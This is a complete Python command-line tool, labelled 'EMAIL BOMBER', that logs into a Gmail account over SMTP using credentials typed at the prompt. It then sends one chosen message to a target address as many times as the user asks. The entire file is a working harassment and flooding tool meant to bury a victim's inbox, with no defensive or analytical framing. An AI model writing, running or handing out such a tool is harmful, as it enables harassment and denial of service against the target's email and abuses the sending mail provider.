import smtplib
import sys
import time

class bcolors:
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'

def banner():
    print(bcolors.GREEN + '''
 ______ __  __          _____ _        ____   ____  __  __ ____  ______ _____  
 |  ____|  \/  |   /\   |_   _| |      |  _ \ / __ \|  \/  |  _ \|  ____|  __ \ 
 | |__  | \  / |  /  \    | | | |      | |_) | |  | | \  / | |_) | |__  | |__) |
 |  __| | |\/| | / /\ \   | | | |      |  _ <| |  | | |\/| |  _ <|  __| |  _  / 
 | |____| |  | |/ ____ \ _| |_| |____  | |_) | |__| | |  | | |_) | |____| | \ \ 
 |______|_|  |_/_/    \_\_____|______| |____/ \____/|_|  |_|____/|______|_|  \_\
                                                                                
By tt_Dude, use GMAIL
                                                                                ''')

class EmailBomb:
    def __init__(self):
        print(bcolors.YELLOW + "-_-_- Initializing -_-_-\n")
    def main(self):
        try:
            usname = input(bcolors.YELLOW + "[~] Enter Email (to send from) |> ")
            passwd = input(bcolors.YELLOW + "[~] Enter Password |> ")
            print(bcolors.YELLOW + "-_-_- Logging in -_-_-\n")
            s = smtplib.SMTP('smtp.gmail.com', 587)
            s.ehlo()
            print(bcolors.YELLOW + '[~] Starting TLS')
            s.starttls()
            print(bcolors.GREEN + '[+] TLS Started')
            s.ehlo()
            s.login(usname, passwd)
            print(bcolors.GREEN + '[+] Logged in\n')
        except KeyboardInterrupt:
            print(bcolors.YELLOW + "Goodbye\n")
            sys.exit(1)
        except Exception as e:
            print(f"Error {e}, Goodbye")
            sys.exit(1)
        traget = input(bcolors.YELLOW + '[~] Enter Target |> ')
        message = input(bcolors.YELLOW + '[~] Enter Message |> ')
        try:
            amount = int(input(bcolors.YELLOW+ '[~] Enter Amount |> '))
        except KeyboardInterrupt:
            print(bcolors.YELLOW + "Goodbye\n")
            sys.exit(1)
        except Exception as e:
            print(bcolors.RED + f'[-] {e}')
        print(bcolors.YELLOW + '-_-_- Sending Email -_-_-\n')
        t = time.time()
        for i in range(amount):
            s.sendmail(usname, traget, message)
            print(bcolors.GREEN + f"[+] Email {i} sent")
        print('\n')
        print(bcolors.GREEN + f'-_-_- Entry job took {time.time()-t} -_-_-')

if __name__ == "__main__":
    banner()
    bomb = EmailBomb()
    bomb.main()